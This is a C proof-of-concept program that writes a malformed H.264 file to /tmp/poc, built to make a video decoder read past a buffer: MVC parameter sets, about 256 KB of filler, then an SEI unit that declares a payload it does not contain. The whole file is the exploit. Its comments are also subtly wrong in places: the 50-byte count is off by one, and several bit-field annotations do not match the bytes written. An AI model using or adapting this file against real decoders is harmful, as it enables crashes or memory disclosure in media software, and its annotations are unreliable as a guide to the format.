#include <stdio.h>
#include <stdlib.h>

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* Write start code prefix for subset SPS */
    fputc(0x00, f);
    fputc(0x00, f);
    fputc(0x01, f);

    /* Subset SPS NAL header: 0x6F (nal_ref_idc=3, nal_unit_type=15) */
    fputc(0x6F, f);

    /* Base SPS payload: profile_idc = 118 (Multiview High Profile) */
    fputc(0x76, f); /* profile_idc = 118 */
    fputc(0x20, f); /* constraint_set3_flag=1 (multiview), others 0 */
    fputc(0x14, f); /* level_idc = 20 */
    fputc(0x80, f); /* seq_parameter_set_id=0, log2_max_frame_num_minus4=0 */
    fputc(0x00, f); /* pic_order_cnt_type=0, log2_max_pic_order_cnt_lsb_minus4=0 */
    fputc(0x01, f); /* max_num_ref_frames=1 */
    fputc(0x00, f); /* gaps_in_frame_num_allowed_flag=0 */
    fputc(0x7f, f); /* pic_width_in_mbs_minus1 = 21 (352/16 - 1) */
    fputc(0x11, f); /* pic_height_in_map_units_minus1 = 17 (288/16 - 1) */
    fputc(0x00, f); /* frame_mbs_only_flag=1, mb_adaptive_frame_field=0, direct_8x8_inference=0 */
    fputc(0x00, f); /* frame_cropping_flag=0 */
    fputc(0x00, f); /* vui_parameters_present_flag=0 */

    /* Subset SPS MVC extension */
    fputc(0x80, f); /* additional_extension2_flag=0, mvc_extension_flag=1, reserved=0 */
    fputc(0x00, f); /* num_anchor_refs_l0=0, num_anchor_refs_l1=0 */
    fputc(0x00, f); /* num_non_anchor_refs_l0=0, num_non_anchor_refs_l1=0 */
    fputc(0x00, f); /* num_level_values_signalled_minus1=0 */
    fputc(0x14, f); /* level_idc=20 */
    fputc(0x00, f); /* num_applicable_ops_minus1=0 */
    fputc(0x00, f); /* applicable_op_temporal_id=0, applicable_op_target_view_id=0 */
    fputc(0x00, f); /* applicable_op_num_views_minus1=0 */
    fputc(0x00, f); /* view_id[0]=0 */
    fputc(0x00, f); /* mvc_extension_flag=0, additional_extension2_flag=0 */

    /* Write PPS NAL unit */
    fputc(0x00, f);
    fputc(0x00, f);
    fputc(0x01, f);
    fputc(0x68, f); /* PPS NAL header */
    fputc(0x00, f); /* pic_parameter_set_id=0 */
    fputc(0x01, f); /* seq_parameter_set_id=0 */
    fputc(0x00, f); /* entropy_coding_mode_flag=0 */
    fputc(0x00, f); /* bottom_field_pic_order_in_frame_present_flag=0 */
    fputc(0x00, f); /* num_slice_groups_minus1=0 */
    fputc(0x00, f); /* num_ref_idx_l0_default_active_minus1=0 */
    fputc(0x00, f); /* num_ref_idx_l1_default_active_minus1=0 */
    fputc(0x00, f); /* weighted_pred_flag=0, weighted_bipred_idc=0 */
    fputc(0x00, f); /* pic_init_qp_minus26=0, pic_init_qs_minus26=0 */
    fputc(0x00, f); /* chroma_qp_index_offset=0, deblocking_filter_control_present_flag=0 */
    fputc(0x00, f); /* constrained_intra_pred_flag=0, redundant_pic_cnt_present_flag=0 */

    /* Write IDR slice NAL unit (minimal I-slice) */
    fputc(0x00, f);
    fputc(0x00, f);
    fputc(0x01, f);
    fputc(0x65, f); /* IDR slice NAL header (nal_unit_type=5, nal_ref_idc=3) */
    fputc(0x88, f); /* first_mb_in_slice=0, slice_type=2 (I slice) */
    fputc(0x00, f); /* pic_parameter_set_id=0, frame_num=0 */
    fputc(0x00, f); /* idr_pic_id=0 */
    fputc(0x00, f); /* slice data */
    fputc(0x00, f);
    fputc(0x00, f);

    /* Calculate filler: we need SEI start code at offset 255993.
       Current bytes written: 3+1+12+10 + 3+1+10 + 3+1+6 = 50 bytes.
       Filler = 255993 - 50 = 255943 bytes. */
    size_t filler_len = 255993 - 50;
    for (size_t i = 0; i < filler_len; i++) {
        fputc(0x00, f);
    }

    /* Write start code for SEI */
    fputc(0x00, f);
    fputc(0x00, f);
    fputc(0x01, f);

    /* SEI NAL unit: header, payload type, payload size (no payload bytes) */
    fputc(0x06, f); /* SEI NAL header */
    fputc(0x01, f); /* payload type = Film Grain Characteristics */
    fputc(0x04, f); /* payload size = 4 (read will go past buffer) */

    fclose(f);
    return 0;
}